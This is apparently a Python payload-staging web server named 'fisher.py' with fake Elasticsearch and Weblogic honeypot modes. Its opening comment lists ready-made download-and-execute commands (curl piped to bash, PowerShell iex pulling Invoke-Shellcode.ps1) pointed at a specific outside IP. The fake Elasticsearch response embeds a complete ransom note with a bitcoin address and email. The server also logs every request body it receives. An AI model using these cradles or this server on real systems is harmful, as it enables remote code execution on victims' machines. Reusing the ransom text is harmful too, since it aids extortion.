# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

# Linux
'''
curl https://170.170.13.87:8443/1.sh -k -s|bash
wget https://170.170.13.87:8443/1.sh --no-check-certificate
'''

# Windows
'''
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iex(New-Object Net.WebClient).DownloadString('https://170.170.13.87:8443/Invoke-Shellcode.ps1')

(New-Object Net.WebClient).DownloadFile('https://170.170.13.87:8443/1.zip','c:\1.zip')
'''

import ssl, http.server
import optparse
import cgi
import pprint
import datetime
import os
import platform
import random
import json

log_file = ""
current_path = ""
data_path = ""
random_path = []
honeypot = 0
protocol=""
port=""

def fake_elasticsearch(obj,uri,query_type):
    _nodes = "{\r\n\
        \"cluster_name\": \"elasticsearch\",\r\n\
        \"nodes\":\r\n\
        {\r\n\
            \"x1JG6g9PRHy6ClCOO2-C4g\":\r\n\
            {\r\n\
                \"name\": \"\",\r\n\
                \"transport_address\": \"inet[/:9300]\",\r\n\
                \"host\": \"elk\",\r\n\
                \"ip\": \"127.0.1.1\",\r\n\
                \"version\": \"\",\r\n\
                \"build\": \"89d3241\",\r\n\
                \"http_address\": \"inet[/:9200]\",\r\n\
                \"os\":\r\n\
                {\r\n\
                    \"refresh_interval_in_millis\": 1000,\r\n\
                    \"available_processors\": 12,\r\n\
                    \"cpu\":\r\n\
                    {\r\n\
                        \"total_cores\": 24,\r\n\
                        \"total_sockets\": 48,\r\n\
                        \"cores_per_socket\": 2\r\n\
                    }\r\n\
                },\r\n\
                \"process\":\r\n\
                {\r\n\
                    \"refresh_interval_in_millis\": 1000,\r\n\
                    \"id\": 2039,\r\n\
                    \"max_file_descriptors\": 65535,\r\n\
                    \"mlockall\": \"False\"\r\n\
                },\r\n\
                \"jvm\":\r\n\
                {\r\n\
                    \"version\": \"1.7.0_65\"\r\n\
                },\r\n\
                \"network\":\r\n\
                {\r\n\
                    \"refresh_interval_in_millis\": 5000,\r\n\
                    \"primary_interface\":\r\n\
                    {\r\n\
                        \"address\": \"\",\r\n\
                        \"name\": \"eth0\",\r\n\
                        \"mac_address\": \"08:01:c7:3F:15:DD\"\r\n\
                    }\r\n\
                },\r\n\
                \"transport\":\r\n\
                {\r\n\
                    \"bound_address\": \"inet[/0:0:0:0:0:0:0:0:9300]\",\r\n\
                    \"publish_address\": \"inet[/:9300]\"\r\n\
                },\r\n\
                \"http\":\r\n\
                {\r\n\
                    \"bound_address\": \"inet[/0:0:0:0:0:0:0:0:9200]\",\r\n\
                    \"publish_address\": \"inet[/:9200]\",\r\n\
                    \"max_content_length_in_bytes\": 104857600\r\n\
                }\r\n\
            }\r\n\
        }\r\n\
    }"
    _index = "{\r\n\
  \"name\" : \"b5c8bbb2116f\",\r\n\
  \"cluster_name\" : \"elasticsearch\",\r\n\
  \"cluster_uuid\" : \"zaB2D2C_Qqabg7a3uzUgIw\",\r\n\
  \"version\" : {\r\n\
    \"number\" : \"7.4.2\",\r\n\
    \"build_flavor\" : \"default\",\r\n\
    \"build_type\" : \"docker\",\r\n\
    \"build_hash\" : \"2f90bbf7b93631e52bafb59b3b049cb44ec25e96\",\r\n\
    \"build_date\" : \"2019-10-28T20:40:44.881551Z\",\r\n\
    \"build_snapshot\" : false,\r\n\
    \"lucene_version\" : \"8.2.0\",\r\n\
    \"minimum_wire_compatibility_version\" : \"6.8.0\",\r\n\
    \"minimum_index_compatibility_version\" : \"6.0.0-beta1\"\r\n\
    },\r\n\
    \"tagline\" : \"You Know, for Search\"\r\n\
}"
    _cat__indices = "yellow open read_me Zp3uE-8tQvGhjfQqQMW6-g 1 1 1 0 4.4kb 4.4kb"
    _plugin__head = "{\"error\":\"Incorrect HTTP method for uri [/_plugin/head/] and method [GET], allowed: [POST]\",\"status\":405}"
    _status = "{\"error\":\"Incorrect HTTP method for uri [/_plugin/head/] and method [GET], allowed: [POST]\",\"status\":405}"
    _river = "{\"error\":{\"root_cause\":[{\"type\":\"invalid_index_name_exception\",\"reason\":\"Invalid index name [_river], must not start with '_'.\",\"index_uuid\":\"_na_\",\"index\":\"_river\"}],\"type\":\"invalid_index_name_exception\",\"reason\":\"Invalid index name [_river], must not start with '_'.\",\"index_uuid\":\"_na_\",\"index\":\"_river\"},\"status\":400}"
    _search = "{\"took\":0,\"timed_out\":false,\"_shards\":{\"total\":1,\"successful\":1,\"skipped\":0,\"failed\":0},\"hits\":{\"total\":{\"value\":1,\"relation\":\"eq\"},\"max_score\":1.0,\"hits\":[{\"_index\":\"read_me\",\"_type\":\"_doc\",\"_id\":\"1\",\"_score\":1.0,\"_source\":{\"@timestamp\": \"2099-11-15T13:12:00\", \"message\": \"All indexs has been dropped. But we backup all indexs. The only method of recoveribing database is to pay 0.015 BTC. Transfer to this BTC address 1JUvAusiHxWt7mkdbwupb5RZhxnBqvy5CZ . You can buy bitcoin here, does not take much time to buy https://localbitcoins.com or https://buy.moonpay.io/ . After paying write to me in the mail with your DB IP: recmydata@onionmail.org and you will receive a link to download your database dump.\n\"}}]}}"
    _zjftu = "{\"error\":{\"root_cause\":[{\"type\":\"invalid_index_name_exception\",\"reason\":\"Invalid index name [_river], must not start with '_'.\",\"index_uuid\":\"_na_\",\"index\":\"_river\"}],\"type\":\"invalid_index_name_exception\",\"reason\":\"Invalid index name [_river], must not start with '_'.\",\"index_uuid\":\"_na_\",\"index\":\"_river\"},\"status\":400}"
    data=""
    if '/' == uri:
        data=_index
    if uri.startswith('/_nodes'):
        data=_nodes
    if uri.startswith('/_cat/indices'):
        data=_cat__indices
    if uri.startswith('/_plugin/head/'):
        data=_plugin__head
    if uri.startswith('/_status'):
        data=_status
    if uri.startswith('/_river'):
        data=_river
    if uri.startswith('/_search'):
        data=_search
    if uri.startswith('/zjftu/'):
        data=_zjftu
    if data:
        obj.send_response(200)
        obj.send_header('Content-type', 'text/plain; charset=utf-8')
        obj.end_headers()
        obj.wfile.write(data.encode('utf-8'))
        return True
    else:
        return False

def fake_weblogic(obj,uri,query_type):
    if '/login' in uri or '/' == uri:
        obj.path = '/OracleWebLogic.html'
        if query_type=='GET':
            http.server.SimpleHTTPRequestHandler.do_GET(obj)
        else:
            #obj.send_response(302)
            #obj.log_request(302)
            obj.send_response_only(302, "")
            obj.send_header('Server', "www.google.com")
            obj.send_header('Date', obj.date_time_string())
            obj.send_header('Location','/login')
            obj.end_headers()
        return True
    return False

def honeypot_handler(obj,honeypot,query_type):
    if query_type == 'POST':
        req_datas = obj.rfile.read(int(obj.headers['content-length']))
    with open(log_file, 'a+', encoding='UTF-8') as f:
        timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write("\n------------------------------------------------\n")
        content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(obj.address_string(), timenow, obj.command, obj.path)
        f.write(content+"\n")
        f.write(str(obj.headers))
        if query_type == 'POST':
            f.write(req_datas.decode())
            print("\033[1;31m[H] %s\033[0m" %(content))
            print("\033[1;31m[H] %s\033[0m" %(req_datas.decode()))
        else:
            print("\033[1;31m[H] %s\033[0m" %(content))
        f.close()
    if honeypot == 1:
        ret = fake_elasticsearch(obj,obj.path,query_type)
    if honeypot == 2:
        ret = fake_weblogic(obj,obj.path,query_type)
    if ret:
        return True
    else:
        return False
    
class MyHTTPSServer(http.server.SimpleHTTPRequestHandler):
    global honeypot
    
    def do_GET(self):
        if honeypot:
            if honeypot_handler(self,honeypot,"GET"):
                return
        if self.path[-1] == '/':
            self.path = '/00000000000000000000404.html'
        with open(log_file, 'a+', encoding='UTF-8') as f:
            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write("------------------------------------------------\n")
            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
            f.write(content+"\n")
            f.write(str(self.headers))
            f.close()
        '''
        f = http.server.SimpleHTTPRequestHandler.send_head(self)
        if f:
            try:
                http.server.SimpleHTTPRequestHandler.copyfile(f, http.server.SimpleHTTPRequestHandler.wfile)
            finally:
                f.close()
        return
        '''
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
        

    def do_POST(self):
        if honeypot:
            if honeypot_handler(self,honeypot,"POST"):
                return
        if self.path[-1] == '/':
            self.path = '/00000000000000000000404.html'
        req_datas = self.rfile.read(int(self.headers['content-length']))
        with open(log_file, 'a+', encoding='UTF-8') as f:
            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write("------------------------------------------------\n")
            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
            f.write(content+"\n")
            f.write(str(self.headers))
            f.write(req_datas.decode())
            f.close()
        print(content)
        # send ?
        data= {
            'result_code':'2',
            'result_desc':'Success',
            'timestamp': '',
            'data': {'message_id':'25d55ad283aa400af464c76d713c07ad'}
        }
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
        return
        
def show_banner():
    content = "===================================================================================\n___________.__       .__                  \r\n\\_   _____/|__| _____|  |__   ___________ \r\n |    __)  |  |/  ___/  |  \\_/ __ \\_  __ \\\r\n |     \\   |  |\\___ \\|   Y  \\  ___/|  | \\/\r\n \\___  /   |__/____  >___|  /\\___  >__|   \r\n     \\/            \\/     \\/     \\/                       @aplyc1a    \n===================================================================================\n"
    print(content)

def get_random_str(bits):
    num_set = [chr(i) for i in range(48,58)]
    char_set = [chr(i) for i in range(97,123)]
    char_set2 = [chr(i) for i in range(65,91)]
    total_set = num_set + char_set + char_set2

    value_set = "".join(random.sample(total_set, bits))

    return value_set

def do_preparation():
    global log_file
    global data_path
    global current_path
    global protocol
    global port
    global honeypot
    
    import shutil
    print("\033[1;33m[>] Preparaing......\033[0m")
    #目录
    current_path = os.getcwd()
    if platform.system() == 'Windows':
        log_path = current_path + "\\log"
        log_file = current_path + "\\log\\%s%s-access.log" %(protocol,port)
        data_path = current_path + "\\data\\"
        html_path = current_path + "\\html-%s%s\\" %(protocol,port)
    else:
        log_path = current_path + "/log"
        log_file = current_path + "/log/%s%s-access.log" %(protocol,port)
        data_path = current_path + "/data/"
        html_path = current_path + "/html-%s%s/" %(protocol,port)
    
    if not os.path.exists(log_path):
        os.makedirs("log")
    if os.path.exists(html_path):
        shutil.rmtree(html_path)
    os.makedirs(html_path)
    os.chdir(html_path)
        
    for i in os.listdir(data_path):
        path = get_random_str(30)
        
        # 拷贝对应蜜罐页面资源文件
        if 'honeypot' in i and honeypot:
            
            if platform.system() == 'Windows':
                print("\033[1;31m[H] %s\\* ==> %s\\\033[0m" %(data_path.replace(current_path,".")+i+"\\"+str(honeypot),".\\html"))
                for j in os.listdir(data_path+i+"\\"+str(honeypot)):
                    shutil.copy(data_path+i+"\\"+str(honeypot)+"\\"+j, ".\\")
            else:
                print("\033[1;31m[H] %s/* ==> %s/\033[0m" %(data_path.replace(current_path,".")+i+"/"+str(honeypot),"./html"))
                for j in os.listdir(data_path+i+"/"+str(honeypot)):
                    shutil.copy(data_path+i+"/"+str(honeypot)+"/"+j, "./")
            continue
        # 拷贝自定义数据至隐蔽目录
        if os.path.isdir(data_path+i):
            os.makedirs(path)
            if platform.system() == 'Windows':
                print("[+] %s ==> %s" %(data_path.replace(current_path,".")+i,html_path.replace(current_path,".")+path+"\\"+i))
                shutil.copytree(data_path+i, path+"\\"+i)
            else:
                print("[+] %s ==> %s" %(data_path.replace(current_path,".")+i,html_path.replace(current_path,".")+path+"/"+i))
                shutil.copytree(data_path+i, path+"/"+i)
            continue
        # 拷贝404页面
        if '404.html' in i :
            shutil.copy(data_path+i, "./")
            continue
        # 拷贝图标文件
        if 'favicon.ico' in i :
            shutil.copy(data_path+i, "./")
            continue
    print("\033[1;33m[>] Done!\033[0m")
    print("\033[1;33m[>] Listening on 0.0.0.0:%s (%s)\033[0m\n" %(port,protocol))

def main():
    global honeypot
    global protocol
    global port
    parser = optparse.OptionParser('python3 fisher.py -p 8443 -s -Z 1' )
    parser.add_option('-p', '--port', dest = 'port', type = 'string', default=443, help = 'set server port to listen on')
    parser.add_option('-s', '--tls', dest = 'tls',  action="store_true", default=False, help='https support')
    parser.add_option('-Z', '--honeypot', dest = 'honeypot', type = int, default=0, help='honeypot mode:\r\n1.elasticsearch\r\n2.weblogic')
    (options,args) = parser.parse_args()
    show_banner()

    port = options.port
    honeypot = options.honeypot
    httpd = http.server.HTTPServer(('0.0.0.0', int(port)), MyHTTPSServer)

    if options.tls:
        SSLContext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        SSLContext.load_cert_chain('server.pem', 'server.pem')
        httpd.socket = SSLContext.wrap_socket(httpd.socket, server_side=True)
        protocol = "https"
        do_preparation()
    else:
        protocol = "http"
        do_preparation()

    httpd.serve_forever()

if __name__ == '__main__': 
    main()
